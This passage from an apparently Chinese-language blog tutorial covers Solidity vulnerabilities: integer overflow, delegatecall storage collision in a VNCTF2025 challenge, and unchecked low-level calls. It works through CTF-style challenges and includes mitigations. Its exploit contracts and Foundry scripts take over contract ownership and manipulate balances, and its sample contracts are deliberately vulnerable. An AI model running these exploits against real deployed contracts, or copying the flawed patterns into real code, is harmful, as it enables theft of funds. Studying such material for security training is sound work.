class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    constructor(address _challengeAddress) &#123;</span><br><span class="line">        challenge = Challenge(_challengeAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        challenge.Get();</span><br><span class="line"></span><br><span class="line">        uint256 overflowAmount = 114514;</span><br><span class="line">//其中第一个地址是自己可以调用的ui，这样才能后面调用题里面的solve函数</span><br><span class="line">        challenge.Transfer(</span><br><span class="line">            0xBA5FE44099e48266E4B3725F800b300Ec70d5f12,</span><br><span class="line">            overflowAmount</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line">import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;Attack&#125; from &quot;../src/Hack.sol&quot;;</span><br><span class="line">import &#123;Deployer&#125; from &quot;../src/2.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ExecuteAttack is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Deployer deployer = new Deployer();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        address target = 0xB91bB4644930252d2eaFE24e1C1Aa6E41228a140;</span><br><span class="line">        bytes32 salt = deployer.computeSalt(target);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;salt:&quot;, uint256(salt));</span><br><span class="line">        address hack_addr = deployer.deployer(salt, target);</span><br><span class="line">        // 调用攻击函数</span><br><span class="line">        Attack(hack_addr).attack();</span><br><span class="line">        console.log(&quot;Attack executed.&quot;);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>其中在脚本里面我们不需要再写一个  Attack attack &#x3D; new Attack{salt: salt}(target); 如果重复写这个会返回一个</p>
<p><img src="https://raw.githubusercontent.com/sanyedegushi/images/master/images/image-20241021194329545.png" alt="image-20241021194329545"></p>
<p>这样的错误</p>
<p>按照正确的脚本部署并且广播后，我们就可以用被传入代币的ui就可以调用合约里面的solve函数，这样flag就出来了</p>
<h2 id="薅羊毛解法"><a href="#薅羊毛解法" class="headerlink" title="薅羊毛解法"></a>薅羊毛解法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line">import &#123;Challenge&#125; from &quot;./1.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        challenge = Challenge(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        if (</span><br><span class="line">            challenge.balance(0xBA5FE44099e48266E4B3725F800b300Ec70d5f12) &lt;</span><br><span class="line">            114500</span><br><span class="line">        ) &#123;</span><br><span class="line">            challenge.Get();</span><br><span class="line">            challenge.Transfer(0xBA5FE44099e48266E4B3725F800b300Ec70d5f12, 49);</span><br><span class="line">        &#125; else if (</span><br><span class="line">            challenge.balance(0xBA5FE44099e48266E4B3725F800b300Ec70d5f12) &lt;</span><br><span class="line">            114514 &amp;&amp;</span><br><span class="line">            challenge.balance(0xBA5FE44099e48266E4B3725F800b300Ec70d5f12) &lt;</span><br><span class="line">            114500</span><br><span class="line">        ) &#123;</span><br><span class="line">            challenge.Get();</span><br><span class="line">            challenge.Transfer(0xBA5FE44099e48266E4B3725F800b300Ec70d5f12, 1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中薅羊毛比溢出麻烦不少，但是如果这个合约的题目是0.8版本，呢么这个题目就肯定需要薅羊毛来解决了</p>
<h1 id="9delegatecall漏洞"><a href="#9delegatecall漏洞" class="headerlink" title="9delegatecall漏洞"></a>9delegatecall漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="delegatecall-的基本原理"><a href="#delegatecall-的基本原理" class="headerlink" title="delegatecall 的基本原理"></a><strong><code>delegatecall</code> 的基本原理</strong></h3><ul>
<li><strong>功能</strong>：<code>delegatecall</code> 允许一个合约（A）调用另一个合约（B）的函数，但执行时<strong>保持合约A的上下文</strong>（存储、<code>msg.sender</code>、<code>msg.value</code> 等）</li>
<li><strong>与普通 <code>call</code> 的区别</strong>：<ul>
<li><code>call</code>：切换上下文，被调用合约（B）在自己的存储中执行。</li>
<li><code>delegatecall</code>：被调用合约（B）的代码在调用合约（A）的上下文中运行。</li>
</ul>
</li>
</ul>
<h2 id="漏洞的核心点"><a href="#漏洞的核心点" class="headerlink" title="漏洞的核心点"></a>漏洞的核心点</h2><ul>
<li>存储布局的不一样，如果A合约的槽位与B合约槽位不一样，如果调用B函数可能会覆盖A合约相对应的槽位的值；</li>
<li>未验证调用目标：允许调用任意或不可信的合约导致恶意代码在A合约的上下文中进行</li>
</ul>
<p>其中以一道ctf题为例子；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EkkoTimeRewind &#123;</span><br><span class="line">    address public owner; //0</span><br><span class="line">    string public constant saying = &quot;U can do Anything in VNCTF2025&quot;;</span><br><span class="line">    bytes4 constant setZDriveownerSignature = bytes4(keccak256(&quot;setZDriveowner(uint256,uint256)&quot;));</span><br><span class="line">    address public rewindBeforeTime; //1</span><br><span class="line">    address public rewindAfterTime; //2</span><br><span class="line">    uint256 public Time0; //3</span><br><span class="line">    uint256 public Time1; //4</span><br><span class="line">    bool private isSetZDriveownerCalled = false;</span><br><span class="line">    bool private isSetTimeCalled = false;</span><br><span class="line">    address public zDriveContractAddress; //5</span><br><span class="line"></span><br><span class="line">    constructor(address _zDriveContractAddress) &#123;</span><br><span class="line">        zDriveContractAddress = _zDriveContractAddress;</span><br><span class="line">        rewindBeforeTime = address(this);</span><br><span class="line">        rewindAfterTime = address(this);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setRewindBeforeTime(uint256 _Time0) public onlyWhitelisted &#123;</span><br><span class="line">        require(!isSetTimeCalled, &quot;setRewindBeforeTime can only be called once&quot;);</span><br><span class="line">        isSetTimeCalled = true;</span><br><span class="line">        Time0 = _Time0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setRewindAfterTime(uint256 _Time1) public onlyWhitelisted &#123;</span><br><span class="line">        require(!isSetTimeCalled, &quot;setRewindAfterTime can only be called once&quot;);</span><br><span class="line">        isSetTimeCalled = true;</span><br><span class="line">        Time1 = _Time1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return (Time0 != 0 &amp;&amp; Time1 != 0 &amp;&amp; Time0 &gt; Time1 + 4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setZDriveowner(bytes[] calldata data) public &#123;</span><br><span class="line">        require(!isSetZDriveownerCalled, &quot;multicallSetZDriveowner has already been called once&quot;);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isSetZDriveownerCalled &amp;&amp; selector == setZDriveownerSignature) &#123;</span><br><span class="line">                (bool success,) = zDriveContractAddress.delegatecall(data[i]); // delegatecall漏洞</span><br><span class="line">                require(success, &quot;Error while delegating call to setZDriveowner&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert(&quot;Invalid selector&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        isSetZDriveownerCalled = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(bytes[] calldata data) public onlyWhitelisted &#123;</span><br><span class="line">        bytes4 rewindBeforeTimeSignature = bytes4(keccak256(&quot;setRewindBeforeTime(uint256)&quot;));</span><br><span class="line">        bytes4 rewindAfterTimeSignature = bytes4(keccak256(&quot;setRewindAfterTime(uint256)&quot;));</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isSetTimeCalled &amp;&amp; selector == rewindBeforeTimeSignature) &#123;</span><br><span class="line">                (bool success,) = rewindBeforeTime.delegatecall(data[i]);</span><br><span class="line">                require(success, &quot;Error while delegating call for rewindBeforeTime&quot;);</span><br><span class="line">            &#125; else if (!isSetTimeCalled &amp;&amp; selector == rewindAfterTimeSignature) &#123;</span><br><span class="line">                (bool success,) = rewindAfterTime.delegatecall(data[i]);</span><br><span class="line">                require(success, &quot;Error while delegating call for rewindAfterTime&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert(&quot;Invalid selector&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">// EVM version istanbul</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ZDriveContract &#123;</span><br><span class="line">    uint256 public ZDriveowner;</span><br><span class="line">    uint256 public Description;</span><br><span class="line">    uint256 private callCounter = 0;</span><br><span class="line"></span><br><span class="line">    event UsefulEvent(string message);</span><br><span class="line"></span><br><span class="line">    function setZDriveowner(uint256 _ZDriveowner, uint256 _Description) public &#123;</span><br><span class="line">        ZDriveowner = _ZDriveowner;</span><br><span class="line">        Description = _Description;</span><br><span class="line">        callCounter++;</span><br><span class="line">        emit UsefulEvent(&quot;Happy Chinese New Year!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSomeConstantInfo() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;VNCTF2025&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中这到ctf题目是考察delegatecall的，首先先把主合约的每个槽位值给标注出来，好进行下一步的操作</p>
<p><strong>利用 <code>setZDriveowner</code> 里的 <code>delegatecall</code>，修改 <code>owner</code>，获得合约控制权</strong>。</p>
<p><strong>利用 <code>setTime</code> 里的 <code>delegatecall</code>，修改 <code>Time0</code> 和 <code>Time1</code>，完成 <code>isSolved()</code> 条件</strong>。</p>
<p>先完成第一步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory data = new bytes[](1);</span><br><span class="line">       data[0] = abi.encodeWithSignature(</span><br><span class="line">           &quot;setZDriveowner(uint256,uint256)&quot;, uint256(uint160(address(msg.sender))), uint256(uint160(address(hack)))</span><br><span class="line">       );//不能是第一个不能是attack,需要时msg.sender</span><br><span class="line"></span><br><span class="line">       target.setZDriveowner(data);</span><br><span class="line">       require(target.owner() == msg.sender, &quot;first-failed&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样我们就有控制权了</p>
<p>第二步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory data2 = new bytes[](1);</span><br><span class="line">        data2[0] = abi.encodeWithSignature(&quot;setRewindBeforeTime(uint256)&quot;, 10);</span><br><span class="line">        target.setTime(data2);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就可以了</p>
<h2 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ZDriveContract.sol&quot;;</span><br><span class="line">import &quot;./EkkoTimeRewind.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public rewindBeforeTime;</span><br><span class="line">    address public rewindAfterTime;</span><br><span class="line">    uint256 public Time0;</span><br><span class="line">    uint256 public Time1;</span><br><span class="line"></span><br><span class="line">    function setRewindBeforeTime(uint256 _Time0) public &#123;</span><br><span class="line">        Time0 = _Time0;</span><br><span class="line">        Time1 = 5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;Attack&#125; from &quot;../src/Attack.sol&quot;;</span><br><span class="line">import &#123;EkkoTimeRewind&#125; from &quot;../src/EkkoTimeRewind.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Attack hack = new Attack();</span><br><span class="line">        EkkoTimeRewind target = EkkoTimeRewind(0xDcfB7f5F176AC5f78aB4CA9d7e0EA6676E87b6E7);</span><br><span class="line"></span><br><span class="line">        bytes[] memory data = new bytes[](1);</span><br><span class="line">        data[0] = abi.encodeWithSignature(</span><br><span class="line">            &quot;setZDriveowner(uint256,uint256)&quot;, uint256(uint160(address(msg.sender))), uint256(uint160(address(hack)))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        target.setZDriveowner(data);</span><br><span class="line">        require(target.owner() == msg.sender, &quot;first-failed&quot;);</span><br><span class="line"></span><br><span class="line">        bytes[] memory data2 = new bytes[](1);</span><br><span class="line">        data2[0] = abi.encodeWithSignature(&quot;setRewindBeforeTime(uint256)&quot;, 10);</span><br><span class="line">        target.setTime(data2);</span><br><span class="line"></span><br><span class="line">        console.log(target.Time0());</span><br><span class="line">        console.log(target.Time1());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就可以了</p>
<h1 id="10-未检查的低级调用"><a href="#10-未检查的低级调用" class="headerlink" title="10 未检查的低级调用"></a>10 未检查的低级调用</h1><h2 id="低级调用"><a href="#低级调用" class="headerlink" title="低级调用"></a>低级调用</h2><p>以太坊的低级调用包括 <code>call()</code>，<code>delegatecall()</code>，<code>staticcall()</code>，和<code>send()</code>。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity">WTF Solidity 极简教程第20-23讲</a>。</p>
<p>最容易出错的是<code>send()</code>：一些合约使用 <code>send()</code> 发送 <code>ETH</code>，但是 <code>send()</code> 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 <code>send()</code> 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 <code>King of Ether</code> 的链游，因为这个漏洞导致退款无法正常发送（<a target="_blank" rel="noopener" href="https://www.kingoftheether.com/postmortem.html">验尸报告</a>）。</p>
<p><img src="https://www.wtf.academy/assets/images/S13-1-734ea9ca7133a511790c92cc74362f1a.png" alt="img"></p>
<h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><h3 id="银行合约-1"><a href="#银行合约-1" class="headerlink" title="银行合约"></a>银行合约</h3><p>这个合约是在<code>S01 重入攻击</code>教程中的银行合约基础上修改而成。它包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；并且包含<code>3</code>个函数：</p>
<ul>
<li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li>
<li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，更新余额，转账。<strong>注意：这个函数没有检查 <code>send()</code> 的返回值，提款失败但余额会清零！</strong></li>
<li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract UncheckedBank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping</span><br><span class="line"></span><br><span class="line">    // 存入ether，并更新余额</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balanceOf[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取msg.sender的全部ether</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        // 获取余额</span><br><span class="line">        uint256 balance = balanceOf[msg.sender];</span><br><span class="line">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        // Unchecked low-level call</span><br><span class="line">        bool success = payable(msg.sender).send(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取银行合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击合约-3"><a href="#攻击合约-3" class="headerlink" title="攻击合约"></a>攻击合约</h2><p>我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 <code>receive()</code> 中的 <code>revert()</code> 将回滚交易，因此它无法接收 <code>ETH</code>；但是提款函数 <code>withdraw()</code> 却能正常调用，清空余额。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    UncheckedBank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(UncheckedBank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 回调函数，转账ETH时会失败</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款函数，调用时 msg.value 设为存款数量</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        bank.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 取款函数，虽然调用成功，但实际上取款失败</span><br><span class="line">    function withdraw() external payable &#123;</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="预防办法-1"><a href="#预防办法-1" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用以下几种方法来预防未检查低级调用的漏洞：</p>
<ol>
<li><p>检查低级调用的返回值，在上面的银行合约中，我们可以改正 <code>withdraw()</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool success = payable(msg.sender).send(balance);</span><br><span class="line">require(success, &quot;Failed Sending ETH!&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>合约转账<code>ETH</code>时，使用 <code>call()</code>，并做好重入保护。</p>
</li>
<li><p>使用<code>OpenZeppelin</code>的<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">Address库</a>，它将检查返回值的低级调用封装好了。</p>
</li>
</ol>
<p>靶场题目也有一个关于未检查的低级调用</p>
<p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">//在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）。</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;); //未检查的低级调用</span><br><span class="line">        //如果我们仅仅用一个revert 只是不能利用call这个低级调用但是不会影响接下来的代码执行</span><br><span class="line">        // 所以我们想要不执行下面的代码还有一种方式就是直接耗光gas不执行接下来的代码</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of 